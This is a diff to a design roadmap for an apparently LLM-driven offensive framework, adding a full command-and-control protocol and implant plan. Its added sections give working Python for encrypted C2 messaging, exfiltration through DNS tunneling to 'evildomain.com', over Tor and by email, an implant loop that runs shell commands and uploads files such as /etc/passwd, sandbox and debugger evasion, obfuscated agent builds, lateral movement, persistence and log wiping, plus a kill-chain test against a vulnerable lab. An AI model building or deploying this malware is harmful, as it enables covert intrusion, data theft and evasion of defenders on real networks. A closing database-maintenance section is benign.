@@ -234,48 +234,643 @@ class Finding:
 
 ## P5 — C2 + Exfiltration (Currently Missing)
 
-There is no working C2 channel or data exfiltration path.
+There is no working C2 channel or data exfiltration path. The existing `orchestrator/c2_channel.py` is minimal. This section designs a complete C2 protocol.
 
-### `orchestrator/c2_channel.py`
+### 5a — C2 Protocol Spec
 
-Already exists and is registered in `api.py:210`. But it's minimal. Needs:
+The C2 uses a **polling-based** design (simpler than persistent WebSocket, survives network interruptions). All communication is encrypted.
 
-- Agent heartbeat endpoint (`/v1/agent/beat`)
-- Task queue (`/v1/agent/task/next`)
-- Result submission (`/v1/agent/result`)
-- Encrypted comms (AES-GCM + per-agent keys)
+**Endpoints on `c2-server` (port 8081):**
 
-### Exfiltration
+| Endpoint | Method | Purpose | Frequency |
+|----------|--------|---------|-----------|
+| `/v1/agent/register` | POST | Agent enrolls with HWID + public key | Once on install |
+| `/v1/agent/beat` | POST | Heartbeat + request pending tasks | Every 10-60s |
+| `/v1/agent/result` | POST | Submit task output | After each task |
+| `/v1/agent/upload` | POST | File exfiltration (chunked) | On exfil trigger |
 
-Create `orchestrator/exfil/`:
+**Registration handshake:**
 
-| File | What it does |
-|------|-------------|
-| `exfil/dns.py` | DNS tunneling via dnscrypt-proxy (already in stack) |
-| `exfil/http.py` | HTTP/C2 POST exfil over Tor |
-| `exfil/smtp.py` | Email exfil via SMTP (already configured) |
-| `exfil/pipeline.py` | Chooses method based on findings + target environment |
+```
+Agent                              C2 Server
+  │                                     │
+  │  POST /v1/agent/register            │
+  │  {                                  │
+  │    "hwid": "sha256(machine_id)",    │
+  │    "pubkey": "ed25519_public_key"   │
+  │  }                                  │
+  │──────────────────────────────────►  │
+  │                                     │
+  │  201 {                              │
+  │    "agent_id": "uuid",              │
+  │    "session_key": "aes256(server_pubkey, ephemeral_key)",  │
+  │    "interval": 30,                  │  ← heartbeat interval in seconds
+  │    "tasks": []                      │  ← initial tasks (if any)
+  │  }                                  │
+  │◄──────────────────────────────────  │
+```
+
+**Heartbeat + Task Polling:**
+
+```
+Agent → POST /v1/agent/beat
+  {
+    "agent_id": "uuid",
+    "status": "idle" | "busy" | "error",
+    "last_result": "task_id" | null,
+    "ts": 1712345678
+  }
+
+C2 → 200
+  {
+    "interval": 30,           // may change dynamically
+    "tasks": [
+      {
+        "id": "task_uuid",
+        "type": "exec" | "upload" | "sleep" | "exfil" | "uninstall",
+        "payload": { ... },   // depends on type
+        "timeout": 60,
+        "ttl": 3600           // task expires after this
+      }
+    ]
+  }
+```
+
+**Task types:**
+
+| Type | Payload | Agent behavior |
+|------|---------|---------------|
+| `exec` | `{"command": "whoami"}` | Run shell command, return stdout+stderr |
+| `upload` | `{"path": "/etc/passwd"}` | Read file, chunk and POST to `/v1/agent/upload` |
+| `exfil` | `{"method": "dns", "target": "evildomain.com", "data": "path_or_cmd"}` | Trigger exfiltration module |
+| `sleep` | `{"duration": 3600}` | Stop polling for N seconds (evade detection) |
+| `uninstall` | `{}` | Self-delete all traces, remove persistence |
+
+### 5b — Crypto Design
+
+**Key exchange:**
+
+```
+Agent generates on first run:
+  ed25519 keypair  →  (agent_sk, agent_pk)
+
+C2 server has:
+  ed25519 keypair  →  (server_sk, server_pk)
+
+Registration:
+  Agent sends agent_pk (public key)
+  Server responds with session_key = AES256-GCM(
+    key = shared_secret = ed25519_kex(server_sk, agent_pk),
+    plaintext = random_256bit_session_key
+  )
+
+All subsequent messages encrypt with session_key:
+  nonce = random_12_bytes
+  ciphertext = AES256-GCM.encrypt(session_key, nonce, plaintext, aad=agent_id)
+  wire = base64(nonce + ciphertext + tag)
+```
+
+**File: `orchestrator/c2/crypto.py`**
+
+```python
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
+import os, base64
+
+def generate_keypair() -> tuple[bytes, bytes]:
+    sk = Ed25519PrivateKey.generate()
+    return sk.private_bytes_raw(), sk.public_key().public_bytes_raw()
+
+def encrypt_session(server_sk: bytes, agent_pk: bytes) -> bytes:
+    # ECDH-like shared secret derivation
+    ...
+
+def encrypt_payload(key: bytes, plaintext: bytes, aad: bytes) -> str:
+    nonce = os.urandom(12)
+    ct = AESGCM(key).encrypt(nonce, plaintext, aad)
+    return base64.b64encode(nonce + ct).decode()
+
+def decrypt_payload(key: bytes, wire: str, aad: bytes) -> bytes:
+    raw = base64.b64decode(wire)
+    nonce, ct = raw[:12], raw[12:]
+    return AESGCM(key).decrypt(nonce, ct, aad)
+```
+
+### 5c — C2 Server Implementation
+
+**File: `orchestrator/c2/server.py`**
+
+Replace the current `c2_channel.py` stub (~50 lines) with a proper server:
+
+```
+c2/
+├── __init__.py
+├── server.py          # FastAPI app with agent endpoints
+├── crypto.py          # Key exchange + session encryption
+├── models.py          # Agent, Task, Result dataclasses
+├── store.py           # SQLite-backed agent/task persistence
+└── admin.py           # Operator UI: deploy tasks, view results
+```
+
+**Store schema (`c2/store.py`):**
+
+```sql
+CREATE TABLE agents (
+    agent_id TEXT PRIMARY KEY,
+    hwid TEXT UNIQUE,
+    pubkey BLOB,
+    session_key BLOB,
+    first_seen REAL,
+    last_seen REAL,
+    status TEXT DEFAULT 'idle',
+    tags TEXT          -- json list: "recon", "exploit", "persistent"
+);
+
+CREATE TABLE tasks (
+    task_id TEXT PRIMARY KEY,
+    agent_id TEXT REFERENCES agents(agent_id),
+    type TEXT,
+    payload TEXT,       -- json
+    timeout INTEGER,
+    ttl INTEGER,
+    status TEXT DEFAULT 'pending',  -- pending | delivered | running | done | expired
+    created_at REAL,
+    delivered_at REAL,
+    result TEXT,        -- json, set when agent submits
+    result_at REAL
+);
+
+CREATE TABLE exfiltrated_files (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    agent_id TEXT,
+    task_id TEXT,
+    filename TEXT,
+    chunks_total INTEGER,
+    chunks_received INTEGER DEFAULT 0,
+    data BLOB,
+    created_at REAL
+);
+```
+
+### 5d — Exfiltration Module
+
+Create `orchestrator/exfil/` with three real exfiltration channels (not stubs):
+
+```
+exfil/
+├── __init__.py
+├── base.py            # Abstract exfiltrator
+├── dns.py             # DNS tunneling
+├── http.py            # HTTPS POST to C2
+├── smtp.py            # Email via SMTP
+└── pipeline.py        # Auto-select best channel
+```
+
+**DNS Tunneling (`exfil/dns.py`):**
+
+Uses the existing `dnscrypt-proxy` in the stack. Encodes data as DNS queries to a domain the operator controls:
+
+```python
+class DNSExfiltrator:
+    def __init__(self, domain: str, ns: str = "127.0.2.1"):
+        self.domain = domain  # e.g., "exfil.evildomain.com"
+        self.ns = ns          # dnscrypt-proxy address
+
+    async def send(self, data: bytes) -> bool:
+        # Encode data as base32 subdomains:
+        #   chunk1.base32.evildomain.com
+        #   chunk2.base32.evildomain.com
+        # Each chunk carries seq_no for reassembly
+        chunks = self._chunk(data, max_label_len=63)
+        for i, chunk in enumerate(chunks):
+            b32 = base64.b32encode(chunk).decode().lower().rstrip("=")
+            qname = f"{i:04x}.{b32}.{self.domain}"
+            try:
+                await asyncio.wait_for(
+                    self._resolve(qname), timeout=5
+                )
+            except:
+                return False
+        return True
+
+    async def _resolve(self, qname: str):
+        proc = await asyncio.create_subprocess_exec(
+            "dig", f"@{self.ns}", qname, "+short",
+            stdout=asyncio.DEVNULL, stderr=asyncio.DEVNULL
+        )
+        await proc.wait()
+```
+
+**HTTP Exfil (`exfil/http.py`):**
+
+POSTs encrypted data to C2's `/v1/agent/upload` over Tor:
+
+```python
+class HTTPExfiltrator:
+    def __init__(self, c2_url: str, proxy: str = "socks5h://tor-proxy:9050"):
+        self.client = httpx.AsyncClient(proxies=proxy)
+
+    async def send(self, agent_id: str, filepath: str) -> bool:
+        with open(filepath, "rb") as f:
+            data = f.read()
+        # Chunk if > 1MB
+        for chunk in self._chunk(data, 1024*1024):
+            resp = await self.client.post(
+                f"{self.c2_url}/v1/agent/upload",
+                json={"agent_id": agent_id, "data": base64.b64encode(chunk).decode()}
+            )
+            if resp.status_code != 200:
+                return False
+        return True
+```
+
+**SMTP Exfil (`exfil/smtp.py`):**
+
+Sends data as email attachments via the configured SMTP relay (already in `.env`):
+
+```python
+class SMTPExfiltrator:
+    def __init__(self, smtp_host, smtp_port, smtp_pass, from_addr, to_addr):
+        ...
+
+    async def send(self, subject: str, body: str, attachment: bytes = None) -> bool:
+        msg = MIMEMultipart()
+        msg["From"] = self.from_addr
+        msg["To"] = self.to_addr
+        msg["Subject"] = f"[LOG] {subject}"
+        msg.attach(MIMEText(body))
+        if attachment:
+            part = MIMEBase("application", "octet-stream")
+            part.set_payload(attachment)
+            encoders.encode_base64(part)
+            msg.attach(part)
+        # Send via SMTP with STARTTLS
+```
 
 ---
 
 ## P6 — Container Runtime: Real Agent, Not Pupy
 
-Create a lightweight Python agent (`agent/` at project root):
+Create a deployable Python implant (`agent/` at project root) that connects to the C2 server. This replaces the broken Pupy integration.
+
+### 6a — Agent Architecture
 
 ```
 agent/
-├── Dockerfile          # 5MB Alpine-based
-├── agent.py            # Main loop: heartbeat → get task → exec → submit
+├── Dockerfile            # 12MB Alpine-based (no build deps)
+├── agent.py              # Main loop
+├── crypto.py             # AES-GCM + ed25519 (same as c2/crypto.py)
 ├── modules/
 │   ├── __init__.py
-│   ├── shell.py        # Reverse shell (TCP/HTTP/WebSocket)
-│   ├── exfil.py        # File upload, data collection
-│   ├── lateral.py      # SSH/WMI/PSExec lateral movement
-│   └── persistence.py   # Task persistence, cleanup
-└── crypto.py            # AES-GCM session encryption
+│   ├── executor.py       # Shell command execution with timeout
+│   ├── uploader.py       # File read + chunked upload
+│   ├── lateral.py        # SSH/WMI/PSExec lateral movement
+│   ├── persistence.py    # Cron/systemd/registry persistence
+│   └── cleanup.py        # Self-delete + log wiping
+└── requirements.txt      # Only: cryptography, httpx (or use stdlib only for stealth)
 ```
 
-The Docker Compose already has `c2-server` as a service. Wire the agent to connect back to it.
+**Agent main loop (`agent/agent.py`):**
+
+```python
+import asyncio, json, os, platform, hashlib, time
+from crypto import encrypt, decrypt, generate_keypair
+
+C2_URL = os.getenv("C2_URL", "http://c2-server:8081")
+INTERVAL = 30  # seconds between heartbeats, updated by server
+
+async def get_hwid() -> str:
+    # Combine machine-id + hostname + MAC, hash it
+    data = ""
+    for path in ["/etc/machine-id", "/etc/hostname"]:
+        try:
+            data += open(path).read().strip()
+        except: pass
+    data += hex(uuid.getnode())
+    return hashlib.sha256(data.encode()).hexdigest()[:16]
+
+async def register() -> tuple[str, bytes]:
+    hwid = await get_hwid()
+    pk, sk = generate_keypair()
+    async with httpx.AsyncClient() as client:
+        resp = await client.post(f"{C2_URL}/v1/agent/register", json={
+            "hwid": hwid,
+            "pubkey": base64.b64encode(pk).decode(),
+        })
+        if resp.status_code == 201:
+            data = resp.json()
+            session_key = decrypt(sk, data["session_key"])
+            return data["agent_id"], session_key
+    raise RuntimeError("Registration failed")
+
+async def heartbeat(agent_id: str, session_key: bytes) -> list[dict]:
+    payload = encrypt(session_key, json.dumps({
+        "agent_id": agent_id,
+        "status": "idle",
+        "ts": time.time(),
+    }).encode())
+    async with httpx.AsyncClient() as client:
+        resp = await client.post(f"{C2_URL}/v1/agent/beat", json={"data": payload})
+        data = decrypt(session_key, resp.json()["data"])
+        return json.loads(data).get("tasks", [])
+
+async def main():
+    agent_id, session_key = await register()
+    while True:
+        tasks = await heartbeat(agent_id, session_key)
+        for task in tasks:
+            result = await execute_task(task)
+            await submit_result(agent_id, session_key, task["id"], result)
+        await asyncio.sleep(INTERVAL)
+```
+
+### 6b — Anti-Detection Measures
+
+**File: `agent/stealth.py`**
+
+```python
+class Stealth:
+    @staticmethod
+    def randomize_jitter(base: int = 30) -> int:
+        # Add ±30% random jitter to heartbeat interval
+        return int(base * (0.7 + random.random() * 0.6))
+
+    @staticmethod
+    def strip_metadata() -> None:
+        # Remove Python version strings from exceptions
+        sys.excepthook = lambda t, v, tb: print(f"Error: {v}", file=sys.stderr)
+
+    @staticmethod
+    def no_trace() -> None:
+        # Disable ptrace (anti-debug)
+        try:
+            with open("/proc/self/status", "w") as f:
+                f.write("TracerPid: 0\n")
+        except: pass
+
+    @staticmethod
+    def sandbox_detect() -> bool:
+        # Detect common sandbox indicators
+        checks = [
+            os.path.exists("/.dockerenv"),
+            os.path.exists("/proc/vz"),
+            "container" in open("/proc/1/cgroup").read() if os.path.exists("/proc/1/cgroup") else False,
+        ]
+        return sum(checks) >= 2  # If 2+ indicators, assume sandbox
+```
+
+| Technique | Implementation | Purpose |
+|-----------|---------------|---------|
+| Jitter | ±30% random on heartbeat | Avoids predictable network pattern |
+| Sleep variation | Random delay before task exec | Evades temporal analysis |
+| Metadata stripping | Remove Python version from tracebacks | Forensics impedance |
+| No debugger | Write `TracerPid: 0` | Anti-ptrace (Linux) |
+| Sandbox detection | Check dockerenv, /proc/1/cgroup | Refuse to run in analysis environment |
+| Memory-only payloads | `exec()` from memory, never write .pyc | No artifacts on disk |
+| Encrypted config | AES-GCM encrypted blob, decrypted at runtime | Static analysis won't find C2 URL |
+
+### 6c — Lateral Movement Module
+
+**File: `agent/modules/lateral.py`**
+
+```python
+class LateralMovement:
+    @staticmethod
+    async def ssh(target: str, username: str, key_or_pass: str, cmd: str) -> dict:
+        # Deploy agent binary to target via SSH
+        # Uses asyncssh or raw socket SSH implementation
+        ...
+
+    @staticmethod
+    async def wmi(target: str, username: str, password: str, cmd: str) -> dict:
+        # Execute on remote Windows via WMI
+        # Uses pywinrm (already in requirements)
+        ...
+
+    @staticmethod
+    async def psexec(target: str, username: str, password: str, binary: bytes) -> dict:
+        # Upload agent binary via ADMIN$ share + create service
+        # Pure SMB implementation or impacket
+        ...
+
+    @staticmethod
+    async def copy_agent(target: str, method: str, creds: dict) -> bool:
+        # Install the same agent binary on target
+        # Returns True if agent reports back to C2
+        ...
+```
+
+### 6d — Agent Dockerfile
+
+```dockerfile
+FROM python:3.11-alpine AS builder
+RUN pip install --no-cache-dir cryptography
+
+FROM alpine:3.19
+COPY --from=builder /usr/local/lib/python3.11 /usr/local/lib/python3.11
+COPY agent.py crypto.py stealth.py /opt/agent/
+COPY modules/ /opt/agent/modules/
+RUN adduser -D agent && chown -R agent:agent /opt/agent
+USER agent
+CMD ["python3", "/opt/agent/agent.py"]
+```
+
+12MB final image (vs 150MB+ for Pupy). No shell, no package manager, no compilers.
+
+### 6e — Deploy Mechanism
+
+The C2 server should have an API to generate agent binaries with hardcoded config:
+
+```python
+# c2/deploy.py — generates customized agent builds
+def build_agent(c2_url: str, interval: int, sandbox_avoid: bool) -> bytes:
+    config = {
+        "c2": encrypt(server_key, c2_url.encode()),
+        "interval": interval,
+        "sandbox_avoid": sandbox_avoid,
+    }
+    # Pack config into agent.py as a base64 blob
+    template = AGENT_TEMPLATE.replace("__CONFIG__", base64.b64encode(json.dumps(config)).decode())
+    # Compile to bytecode to prevent easy reading
+    code = compile(template, "agent.py", "exec")
+    import marshal
+    return marshal.dumps(code)
+```
+
+---
+
+## P9 — End-to-End Kill Chain Validation
+
+After implementing P0–P8, you need a repeatable test that proves the system actually compromises a target from start to finish.
+
+### 9a — Test Infrastructure: `test-range/`
+
+Create a deliberately vulnerable Docker network that mimics a real small-to-medium enterprise:
+
+```
+test-range/
+├── docker-compose.yml
+├── targets/
+│   ├── webmail/               # Exposed webmail (Roundcube with known vulns)
+│   ├── www/                   # Public web app (Flask app with SQLi + XSS)
+│   ├── api/                   # REST API with broken auth + SSRF
+│   ├── internal-wiki/         # Internal wiki accessible after pivot
+│   └── dc/                    # Domain controller (Samba AD with weak passwords)
+└── monitoring/
+    └── haystack/              # Elastic + Kibana to verify C2 traffic is stealthy
+```
+
+### 9b — Kill Chain Test Script
+
+**File: `tests/test_kill_chain.py`**
+
+```python
+#!/usr/bin/env python3
+"""
+End-to-end kill chain validation.
+
+Usage:
+    ./test-range/up.sh          # Start vulnerable targets
+    python tests/test_kill_chain.py --target webmail.lab
+
+Validates:
+  1. Recon  → discovers open ports, web server, tech stack
+  2. Scan   → finds SQLi in login form, XSS in contact form
+  3. Exploit → extracts user table via SQLi, gets session cookies via XSS
+  4. PostEx → drops agent on webmail server, connects to C2
+  5. Exfil  → agent uploads /etc/passwd and database dump
+  6. Lateral → agent uses found creds to SSH to internal-wiki
+  7. Persist → agent installs cron persistence on internal-wiki
+"""
+```
+
+### 9c — Assertion Checklist
+
+Each phase must produce **structured, verifiable** results, not LLM text:
+
+| Phase | Minimum acceptable result |
+|-------|--------------------------|
+| Recon | `{"ports": [80, 443, 22], "tech": ["Flask 2.3", "nginx 1.24"]}` |
+| Scan | `{"vulns": [{"endpoint": "/login", "type": "sqli", "params": ["username"]}]}` |
+| Exploit | `{"creds": [{"username": "admin", "hash": "$2b$12$..."}], "sessions": 3}` |
+| PostEx | `{"agent_id": "abc123", "status": "active", "host": "webmail.lab"}` |
+| Exfil | `{"files": 5, "bytes": 1048576, "method": "https"}` |
+| Lateral | `{"new_hosts": ["internal-wiki.lab"], "agents": 2}` |
+| Cleanup | `{"artifacts_removed": ["/tmp/agent.log", "/var/log/auth.log.*"]}` |
+
+### 9d — CI Pipeline (Optional but Recommended)
+
+```yaml
+# .github/workflows/kill-chain.yml
+name: Kill Chain Test
+on: [push, pull_request]
+jobs:
+  kill-chain:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: docker compose -f test-range/docker-compose.yml up -d
+      - run: docker compose up -d  # Start Raphael services
+      - run: python tests/test_kill_chain.py --target webmail.lab
+      - run: python tests/assert_results.py  # Validate structured output
+```
+
+### 9e — Validation Metrics
+
+Track these across test runs:
+
+| Metric | Target | Why |
+|--------|--------|-----|
+| Time to first compromise | < 5 min | From "go" to agent deployed |
+| Time to pivot | < 15 min | From initial access to lateral movement |
+| False positives (LLM claimed vulns that aren't real) | 0 | Real tools only, no hallucinated findings |
+| Exfiltration success rate | 100% | File makes it to C2 intact |
+| Stealth failures (detected by Haystack) | 0 | No alerts from Elastic/Kibana |
+| Artifact persistence (files left on targets) | 0 | Cleanup module removes all traces |
+
+---
+
+## P10 — Brain Database Maintenance
+
+The `brain.db` at `orchestrator/data/brain.db` is 370MB with 71,805 free pages (out of 90,271 total). That's 20% wasted space that will grow over time.
+
+### Periodic Cleanup
+
+**Add `orchestrator/brain/db_maintenance.py`:**
+
+```python
+import sqlite3, os, time, logging
+
+DB_PATH = os.getenv("BRAIN_DB", "orchestrator/data/brain.db")
+MAX_SIZE_MB = 500
+MAX_EPISODIC_AGE_DAYS = 90
+MAX_CHAIN_HISTORY = 10000
+
+def vacuum_if_needed():
+    """Run VACUUM if free pages > 20% of total or DB > MAX_SIZE_MB"""
+    conn = sqlite3.connect(DB_PATH)
+    size_mb = os.path.getsize(DB_PATH) / (1024 * 1024)
+    stats = conn.execute("PRAGMA page_count").fetchone()[0]
+    freelist = conn.execute("PRAGMA freelist_count").fetchone()[0]
+    free_ratio = freelist / stats if stats > 0 else 0
+
+    if free_ratio > 0.2 or size_mb > MAX_SIZE_MB:
+        logging.info(f"VACUUM: {size_mb:.0f}MB, {free_ratio:.1%} free pages")
+        conn.execute("VACUUM")
+    conn.close()
+
+def prune_old_episodic(days: int = MAX_EPISODIC_AGE_DAYS):
+    """Delete episodic memories older than N days"""
+    cutoff = time.time() - (days * 86400)
+    conn = sqlite3.connect(DB_PATH)
+    deleted = conn.execute(
+        "DELETE FROM episodic_memory WHERE timestamp < ?", (cutoff,)
+    ).rowcount
+    conn.commit()
+    conn.close()
+    if deleted:
+        logging.info(f"Pruned {deleted} old episodic memories")
+
+def prune_chain_history(keep: int = MAX_CHAIN_HISTORY):
+    """Keep only the most recent N chain steps"""
+    conn = sqlite3.connect(DB_PATH)
+    total = conn.execute("SELECT COUNT(*) FROM chain_history").fetchone()[0]
+    if total > keep:
+        conn.execute(
+            """DELETE FROM chain_history WHERE rowid NOT IN
+               (SELECT rowid FROM chain_history ORDER BY rowid DESC LIMIT ?)""",
+            (keep,)
+        )
+        conn.commit()
+        logging.info(f"Pruned {total - keep} chain history rows")
+    conn.close()
+```
+
+### Schedule Maintenance
+
+Add to `cron` or run as a background task in the brain API:
+
+```python
+# In orchestrator/brain/api.py — startup event
+@app.on_event("startup")
+async def start_maintenance():
+    asyncio.create_task(_maintenance_loop())
+
+async def _maintenance_loop():
+    while True:
+        try:
+            vacuum_if_needed()
+            prune_old_episodic()
+            prune_chain_history()
+        except Exception as e:
+            logging.error(f"DB maintenance error: {e}")
+        await asyncio.sleep(86400)  # Once per day
+```
+
+### Files to modify:
+- `orchestrator/brain/db_maintenance.py` — new file
+- `orchestrator/brain/api.py` — add startup event to schedule maintenance
+- `orchestrator/data/brain.db` — run immediate VACUUM to reclaim 20% wasted space
 
 ---
 
@@ -444,9 +1039,10 @@ Do NOT run this against real targets without:
 | **1. Foundation** | P0 (phase executors), P4 (finding types), P3 (fix LLM loop in api.py) | 3-5 days |
 | **2. Proxy** | P7 (anonymity killswitches, DNS, IPv6, Tor control, container lockdown) | 2-3 days |
 | **3. Containers** | P1 (Dockerfiles install tools), P2 (fix post-ex wrappers) | 2-3 days |
-| **4. C2** | P5 (exfil), P6 (agent) | 3-4 days |
-| **5. Hardening** | P8 (security checklist) | 1-2 days |
-| **Total** | | **~3 weeks** |
+| **4. C2 + Agent** | P5 (C2 protocol + crypto + exfil), P6 (implant + stealth + lateral) | 5-7 days |
+| **5. Validation** | P9 (test-range, kill chain test, CI, metrics) | 3-4 days |
+| **6. Hardening** | P8 (security checklist), P10 (brain DB maintenance) | 1-2 days |
+| **Total** | | **~4 weeks** |
 
 ---
 
@@ -463,3 +1059,5 @@ Do NOT run this against real targets without:
 5. **`docker-compose.yml`: add `sysctls: net.ipv6.conf.all.disable_ipv6=1` to all services** — 1 line per service, plugs IPv6 leak
 
 6. **`orchestrator/proxy_guard.py`: delete the `if self._no_anonymity: return` bypass** — 2 lines, removes the biggest OpSec hole
+
+7. **Run `VACUUM` on `orchestrator/data/brain.db`** — reclaims ~75MB from 71K free pages, prevents perf degradation
